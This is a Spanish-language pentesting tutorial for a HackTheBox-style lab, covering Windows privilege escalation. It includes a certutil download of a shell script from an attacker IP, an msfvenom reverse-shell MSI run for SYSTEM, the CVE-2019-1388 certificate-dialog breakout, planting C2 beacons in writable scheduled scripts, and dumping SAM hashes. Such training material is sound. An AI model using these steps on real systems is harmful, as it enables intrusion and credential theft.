
# Técnicas varias

## <mark style="color:purple;">Living Off The Land Binaries and Scripts (LOLBAS)</mark>

El [proyecto LOLBAS](https://lolbas-project.github.io/) documenta archivos binarios, scripts y bibliotecas que se pueden utilizar para técnicas de "vivir de la tierra" en sistemas Windows. Cada uno de estos archivos binarios, scripts y bibliotecas es un archivo firmado por Microsoft que es nativo del sistema operativo o se puede descargar directamente desde Microsoft y tiene una funcionalidad inesperada que puede resultar útil para un atacante. Algunas funciones interesantes pueden incluir:

|                               |                       |                            |
| ----------------------------- | --------------------- | -------------------------- |
| Ejecución de código           | Compilación de código | Transferencias de archivos |
| Persistencia                  | Omisión de UAC        | Robo de credenciales       |
| Proceso de volcado de memoria | Registro de teclas    | Evasión                    |
| Secuestro de DLL              |                       |                            |

### **Transferencia de archivos con Certutil**

Un ejemplo clásico es [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) , cuyo uso previsto es gestionar certificados, pero también se puede utilizar para transferir archivos, ya sea descargando un archivo al disco o codificando/decodificando base64 un archivo.

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### **Codificación de archivos con Certutil**

Podemos usar la flag `-encode` para codificar un archivo usando base64 en nuestro host de ataque de Windows y copiar el contenido a un nuevo archivo en el sistema remoto.

```cmd-session
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

### **Decodificación de archivos con Certutil**

Una vez creado el nuevo archivo, podemos usar la flag `-decode` para decodificar el archivo a su contenido original.

```cmd-session
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

Se puede utilizar un binario como [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) para ejecutar un archivo DLL. Podríamos utilizarlo para obtener un shell inverso ejecutando un archivo .DLL que descargaríamos en el host remoto o que alojaríamos nosotros mismos en un recurso compartido SMB.

Vale la pena revisar este proyecto y familiarizarse con tantos binarios, scripts y bibliotecas como sea posible. Podrían resultar muy útiles durante una evaluación evasiva o una en la que el cliente nos restrinja a una instancia de servidor/estación de trabajo Windows administrada para realizar la prueba.

***

## <mark style="color:purple;">Always Install Elevated</mark>

Esta configuración se puede establecer a través de la Política de grupo local configurando `Always install with elevated privileges` en `Enabled` en las siguientes rutas.

* `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
* `User Configuration\Administrative Templates\Windows Components\Windows Installer`

![imagen](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)

### **Enumerar configuraciones "**&#x41;lways Install Elevate&#x64;**"**

Enumeremos esta configuración.

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Nuestra enumeración nos muestra que la key `AlwaysInstallElevated` existe, por lo que la política está habilitada en el sistema de destino.

### **Generar paquete MSI malicioso**

Podemos explotar esto generando un paquete `MSI` malicioso y ejecutándolo a través de la línea de comandos para obtener un shell inverso con privilegios de SYSTEM.

```shell-session
afsh4ck@kali$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

#### **Ejecutando el paquete MSI**

Podemos cargar este archivo MSI en nuestro destino, iniciar un escucha Netcat y ejecutar el archivo desde el CMD de la siguiente manera:

```cmd-session
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

#### **Recibiendo la shell**

Si todo va según lo previsto, recibiremos una conexión de vuelta como `NT AUTHORITY\SYSTEM`.

```shell-session
afsh4ck@kali$ nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

Este problema se puede mitigar deshabilitando las dos configuraciones de política de grupo local mencionadas anteriormente.

***

## <mark style="color:purple;">CVE-2019-1388</mark>

[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) era una vulnerabilidad de escalada de privilegios en el cuadro de diálogo de certificado de Windows, que no aplicaba correctamente los privilegios de usuario. El problema estaba en el mecanismo UAC, que presentaba una opción para mostrar información sobre el certificado de un ejecutable, abriendo el cuadro de diálogo de certificado de Windows cuando un usuario hace clic en el enlace. El campo `Issued By` en la pestaña General se representa como un hipervínculo si el binario está firmado con un certificado que tiene Identificador de objeto (OID) `1.3.6.1.4.1.311.2.1.10`. Este valor de OID se identifica en el encabezado [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) como [SPC\_SP\_AGENCY\_INFO\_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) , que es el campo `SpcSpAgencyInfo` en la pestaña de detalles del cuadro de diálogo del certificado. Si está presente, un hipervínculo incluido en el campo se representará en la pestaña General. Esta vulnerabilidad se puede explotar fácilmente utilizando un antiguo ejecutable firmado por Microsoft ( [hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html) ) que contiene un certificado con el campo `SpcSpAgencyInfo` rellenado con un hipervínculo.

Al hacer clic en el hipervínculo, se abrirá una ventana del navegador que se ejecutará como `NT AUTHORITY\SYSTEM`. Una vez abierto el navegador, es posible "salir" de él aprovechando la opción `View page source` del menú para iniciar un `cmd.exe` o `PowerShell.exe` como SYSTEM.

Repasemos la vulnerabilidad en la práctica.

Primero haga clic derecho en el ejecutable `hhupd.exe` y seleccione `Run as administrator`

![imagen](https://academy.hackthebox.com/storage/modules/67/hhupd.png)

A continuación, haga clic en `Show information about the publisher's certificate` para abrir el cuadro de diálogo del certificado. Aquí podemos ver que el campo `SpcSpAgencyInfo` está completo en la pestaña Detalles.

![imagen](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

A continuación, volvemos a la pestaña General y vemos que el campo `Issued by` está lleno con un hipervínculo. Haga clic en él y luego en `OK`. Se cerrará el cuadro de diálogo del certificado y se abrirá una ventana del navegador.

![imagen](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

Si abrimos `Task Manager`, veremos que la instancia del navegador se lanzó como SYSTEM.

![imagen](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)

A continuación, podemos hacer clic derecho en cualquier parte de la página web y elegir `View page source`. Una vez que se abra la fuente de la página en otra pestaña, haga clic derecho nuevamente y seleccione `Save as`, y se abrirá un cuadro de diálogo.

![imagen](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)

En este punto, podemos iniciar cualquier programa que queramos como SYSTEM. Escriba la ruta `c:\windows\system32\cmd.exe` y presione Enter. Si todo sale como lo planeado, tendremos una instancia de `cmd.exe` ejecutándose como SYSTEM.

![imagen](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)

Microsoft lanzó un [parche](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) para este problema en noviembre de 2019. Aun así, como muchas organizaciones no aplican los parches, siempre debemos verificar esta vulnerabilidad si obtenemos acceso a la GUI de un sistema potencialmente vulnerable como un usuario con pocos privilegios.

Este [enlace](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) enumera todas las versiones de Windows Server y Workstation vulnerables.

{% hint style="warning" %}
**Nota**: Los pasos anteriores se realizaron utilizando el navegador Chrome y pueden diferir ligeramente en otros navegadores.
{% endhint %}

***

## <mark style="color:purple;">Tareas programadas</mark>

### **Enumeración de tareas programadas**

Podemos utilizar el comando [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) para enumerar las tareas programadas en el sistema.

```powershell
C:\htb>  schtasks /query /fo LIST /v
 
Folder: \
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows\.NET Framework
HostName:                             WINLPE-SRV01
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        5/27/2021 12:23:27 PM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

#### **Enumeración de tareas programadas con PowerShell**

También podemos enumerar tareas programadas utilizando el cmdlet de PowerShell [Get-ScheduledTask .](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps)

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName,State
 
TaskName                                                State
--------                                                -----
.NET Framework NGEN v4.0.30319                          Ready
.NET Framework NGEN v4.0.30319 64                       Ready
.NET Framework NGEN v4.0.30319 64 Critical           Disabled
.NET Framework NGEN v4.0.30319 Critical              Disabled
AD RMS Rights Policy Template Management (Automated) Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                      Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                      Disabled
Microsoft Compatibility Appraiser                       Ready
ProgramDataUpdater                                      Ready
StartupAppTask                                          Ready
appuriverifierdaily                                     Ready
appuriverifierinstall                                   Ready
CleanupTemporaryState                                   Ready
DsSvcCleanup                                            Ready
Pre-staged app cleanup                               Disabled

<SNIP>
```

De forma predeterminada, solo podemos ver las tareas creadas por nuestro usuario y las tareas programadas predeterminadas que tiene cada sistema operativo Windows. Lamentablemente, no podemos enumerar las tareas programadas creadas por otros usuarios (como los administradores) porque se almacenan en `C:\Windows\System32\Tasks`, a las que los usuarios estándar no tienen acceso de lectura. No es raro que los administradores del sistema vayan en contra de las prácticas de seguridad y realicen acciones como proporcionar acceso de lectura o escritura a una carpeta generalmente reservada solo para administradores. Es posible que nos encontremos (aunque es poco frecuente) con una tarea programada que se ejecuta como administrador configurado con permisos de archivo/carpeta débiles por diversas razones. En este caso, es posible que podamos editar la tarea en sí para realizar una acción no deseada o modificar un script ejecutado por la tarea programada.

#### **Comprobación de permisos en el directorio C:\Scripts**

Consideremos un escenario en el que nos encontramos en el cuarto día de un ensayo de penetración de dos semanas. Hemos obtenido acceso a un puñado de sistemas hasta el momento como usuarios sin privilegios y hemos agotado todas las opciones de escalada de privilegios. Justo en ese momento, notamos un `C:\Scripts`directorio en el que se puede escribir que pasamos por alto en nuestra enumeración inicial.

```powershell
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Observamos varios scripts en este directorio, como `db-backup.ps1`, `mailbox-backup.ps1`, etc., que también son todos editables por el `BUILTIN\USERS`grupo. En este punto, podemos agregar un fragmento de código a uno de estos archivos con la suposición de que al menos uno de ellos se ejecuta a diario, si no con mayor frecuencia. Escribimos un comando para enviar una señal de vuelta a nuestra infraestructura C2 y continuamos con las pruebas. A la mañana siguiente, cuando iniciamos sesión, notamos una sola señal `NT AUTHORITY\SYSTEM` en el host DB01.&#x20;

Ahora podemos asumir con seguridad que uno de los scripts de respaldo se ejecutó durante la noche y ejecutó nuestro código adjunto en el proceso. Este es un ejemplo de lo importante que puede ser incluso la más mínima información que descubrimos durante la enumeración para el éxito de nuestro compromiso. La enumeración y la postexplotación durante una evaluación son procesos iterativos. Cada vez que realizamos la misma tarea en diferentes sistemas, podemos estar ganando más piezas del rompecabezas que, cuando se juntan, nos llevarán a nuestro objetivo.

***

## <mark style="color:purple;">Campo de descripción de usuario/equipo</mark>

#### **Comprobación del campo de descripción del usuario local**

Aunque es más común en Active Directory, es posible que un administrador de sistemas almacene detalles de la cuenta (como una contraseña) en un campo de descripción de la cuenta de un usuario o de una computadora. Podemos enumerar esto rápidamente para usuarios locales mediante el cmdlet [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) .

```powershell
PS C:\htb> Get-LocalUser
 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

**Enumeración del campo Descripción de equipo con el cmdlet Get-WmiObject**

También podemos enumerar el campo de descripción de la computadora a través de PowerShell usando el cmdlet [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) con la clase [Win32\_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem) .

&#x20; Técnicas varias

```powershell
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```

***

## <mark style="color:purple;">Montar VHDX/VMDK</mark>

Durante nuestra enumeración, a menudo nos encontraremos con archivos interesantes tanto a nivel local como en unidades compartidas de red. Podemos encontrar contraseñas, claves SSH u otros datos que se pueden utilizar para facilitar nuestro acceso. La herramienta [Snaffler](https://github.com/SnaffCon/Snaffler) puede ayudarnos a realizar una enumeración exhaustiva que de otro modo no podríamos realizar a mano. La herramienta busca muchos tipos de archivos interesantes, como archivos que contienen la frase "pass" en el nombre de archivo, archivos de base de datos de KeePass, claves SSH, archivos web.config y muchos más.

Tres tipos de archivos específicos de interés son los archivos `.vhd`, `.vhdx`y `.vmdk`. Estos son `Virtual Hard Disk`, `Virtual Hard Disk v2`(ambos utilizados por Hyper-V) y `Virtual Machine Disk`(utilizados por VMware). Supongamos que llegamos a un servidor web y no hemos tenido suerte escalando privilegios, por lo que recurrimos a la búsqueda a través de recursos compartidos de red. Nos encontramos con un recurso compartido de copias de seguridad que aloja una variedad de archivos `.VMDK`y `.VHDX`cuyos nombres de archivo coinciden con los nombres de host en la red. Uno de estos archivos coincide con un host en el que no pudimos escalar privilegios con éxito, pero es clave para nuestra evaluación porque hay una sesión de administrador de Active Domain. Si podemos escalar a SYSTEM, es probable que podamos robar el hash de contraseña NTLM del usuario o el ticket TGT de Kerberos y tomar el control del dominio.

Si encontramos alguno de estos tres archivos, tenemos opciones para montarlos en nuestros equipos de ataque locales de Linux o Windows. Si podemos montar un recurso compartido desde nuestro equipo de ataque de Linux o copiar uno de estos archivos, podemos montarlos y explorar los distintos archivos y carpetas del sistema operativo como si estuviéramos conectados a ellos usando los siguientes comandos.

#### **Montar VMDK en Linux**

```shell-session
afsh4ck@kali$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

#### **Montar VHD/VHDX en Linux**

```shell-session
afsh4ck@kali$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

En Windows, podemos hacer clic derecho sobre el archivo y elegir `Mount`, o usar la utilidad `Disk Management` para montar un archivo `.vhd`o `.vhdx`. Si lo preferimos, podemos usar el cmdlet [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) de PowerShell. Independientemente del método, una vez que lo hagamos, el disco duro virtual aparecerá como una unidad con letras que luego podremos explorar.

![imagen](https://academy.hackthebox.com/storage/modules/67/mount.png)

Para un archivo `.vmdk`, podemos hacer clic derecho y elegir `Map Virtual Disk` del menú. A continuación, se nos solicitará que seleccionemos una letra de unidad. Si todo va según lo previsto, podemos explorar los archivos y directorios del sistema operativo de destino. Si esto falla, podemos usar en VMWare Workstation `File --> Map Virtual Disks` para asignar el disco a nuestro sistema base. También podríamos agregar el archivo `.vmdk` a nuestra VM de ataque como un disco duro virtual adicional y luego acceder a él como una unidad con letra. Incluso podemos usarlo `7-Zip`para extraer datos de un archivo `vmdk` . Esta [guía](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) ilustra muchos métodos para obtener acceso a los archivos de un archivo `.vmdk`.

#### **Recuperación de hashes mediante Secretsdump.py**

¿Por qué nos importa un disco duro virtual (especialmente Windows)? Si podemos localizar una copia de seguridad de una máquina activa, podemos acceder al directorio `C:\Windows\System32\Config` y extraer los subárboles de registro `SAM`, `SECURITY` y `SYSTEM`. Luego podemos usar una herramienta como [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) para extraer los hashes de contraseñas de los usuarios locales.

```shell-session
afsh4ck@kali$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>
```

En la siguiente sección profundizamos más sobre esta técnica:

{% content-ref url="/pages/R6QjgH0qNuwUQAgCOVnq" %}
[Atacando a SAM](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/atacando-a-sam.md)
{% endcontent-ref %}

Es posible que tengamos suerte y recuperemos el hash de la contraseña del administrador local para el sistema de destino o encontremos un hash de contraseña de administrador local antiguo que funcione en otros sistemas del entorno (ambas cosas que he hecho en bastantes evaluaciones).

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43

RDP con el usuario “htb-student” y contraseña “HTB_@cademy_stdnt!”
```

### Pregunta 1

> Utilizando las técnicas de esta sección, busque la contraseña en texto plano de una cuenta en el host de destino.

```
xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt!
```

Una vez conectador por RDP abrimos un Powershell como administrador..

#### Enumeración de usuarios del sistema

Al enumerar los usuarios del sistema vemos que en el campo Description del usuario `secsvc` tenemos las credenciales del usuario. Eso es bastante común en entornos Active Directory, y es algo que siempre deberíamos comprobar cuando tenemos acceso a un sistema Windows unido a un dominio.

```powershell
PS C:\tools> Get-LocalUser

Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
mrb3n           True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password: !QAZXS*******
sql_dev         True
```
